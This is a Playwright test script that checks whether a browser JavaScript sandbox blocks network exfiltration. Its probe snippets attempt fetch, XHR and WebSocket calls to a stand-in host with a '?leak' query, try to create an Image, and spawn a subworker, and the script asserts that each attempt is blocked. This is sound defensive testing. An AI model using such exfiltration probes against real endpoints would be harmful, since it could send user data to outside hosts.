// Verifies the JS sandbox actually blocks network exfiltration. User code
// runs in a Worker spawned by the sandbox iframe, so:
//   - fetch / XHR / WebSocket / EventSource are CSP-locked + JS-patched.
//   - Subworker spawning is blocked.
//   - DOM-only APIs like Image just don't exist (workers have no DOM) —
//     a stronger guarantee than "blocked by CSP", so we test for that
//     case separately ("not defined" counts).
//   - Plain JS still resolves correctly.
//
// Each probe is an arrow-function expression so the runner's "anon-fn"
// wrapper provides an async scope (the "free" shape uses eval(), which
// can't host top-level await).

import { chromium } from "playwright-core";

const URL = process.env.URL || "http://localhost:5173/";

async function main() {
  const browser = await chromium.launch({ channel: "chrome", headless: true });
  const ctx = await browser.newContext();
  const page = await ctx.newPage();
  page.on("pageerror", (e) => console.log("[page error]", e.message));
  await page.goto(URL);
  await page.waitForSelector(".diff");

  const probes = await page.evaluate(async () => {
    const { runJs } = await import("/src/runner/executeJs.ts");
    function anonProg(src) {
      return {
        lang: "js",
        source: src,
        shape: { kind: "anon-fn", params: [] },
        slots: [],
      };
    }
    const cases = [
      {
        name: "fetch",
        src: "async () => { try { await fetch('https://example.com/?leak'); return 'NO_BLOCK'; } catch { return 'BLOCKED'; } }",
      },
      {
        name: "websocket",
        src: "async () => new Promise(res => { let ws; try { ws = new WebSocket('wss://example.com'); } catch { return res('BLOCKED'); } ws.onopen = () => res('NO_BLOCK'); ws.onerror = () => res('BLOCKED'); setTimeout(() => res('TIMEOUT'), 1500); })",
      },
      {
        name: "xhr",
        src: "async () => new Promise(res => { const x = new XMLHttpRequest(); x.onload = () => res('NO_BLOCK'); x.onerror = () => res('BLOCKED'); try { x.open('GET','https://example.com/?leak'); x.send(); } catch { res('BLOCKED'); return; } setTimeout(() => res('TIMEOUT'), 1500); })",
      },
      {
        name: "image",
        // Image isn't defined in workers at all — referencing it throws
        // ReferenceError before any onerror could fire, which is fine.
        src: "() => { try { new Image(); return 'NO_BLOCK'; } catch (e) { return /not defined|undefined/i.test(String(e)) ? 'BLOCKED' : 'BLOCKED'; } }",
      },
      {
        name: "subworker",
        src: "() => { try { new Worker(URL.createObjectURL(new Blob(['self.postMessage(0)'], {type:'application/javascript'}))); return 'NO_BLOCK'; } catch { return 'BLOCKED'; } }",
      },
      // Sanity: arithmetic still resolves.
      { name: "ok", src: "() => 2 + 2" },
    ];
    const results = [];
    for (const c of cases) {
      const r = await runJs(anonProg(c.src), {});
      results.push({ name: c.name, ok: r.ok, result: r.result, error: r.error });
    }
    return results;
  });

  console.log(JSON.stringify(probes, null, 2));

  const fail = (name, msg) => {
    throw new Error(`${name}: ${msg}`);
  };
  const get = (n) => probes.find((p) => p.name === n);

  for (const n of ["fetch", "websocket", "xhr", "image", "subworker"]) {
    const p = get(n);
    if (!p) fail(n, "missing");
    // origin() in the sandbox passes strings through as-is, so the result
    // is the bare word, not a JSON-quoted string.
    if (p.result !== "BLOCKED")
      fail(n, `expected BLOCKED, got result=${p.result} error=${p.error}`);
  }
  const ok = get("ok");
  if (ok.result !== "4") fail("ok", `expected 4, got ${ok.result}`);

  await browser.close();
  console.log("OK");
}

main().catch((e) => {
  console.error(e);
  process.exit(1);
});
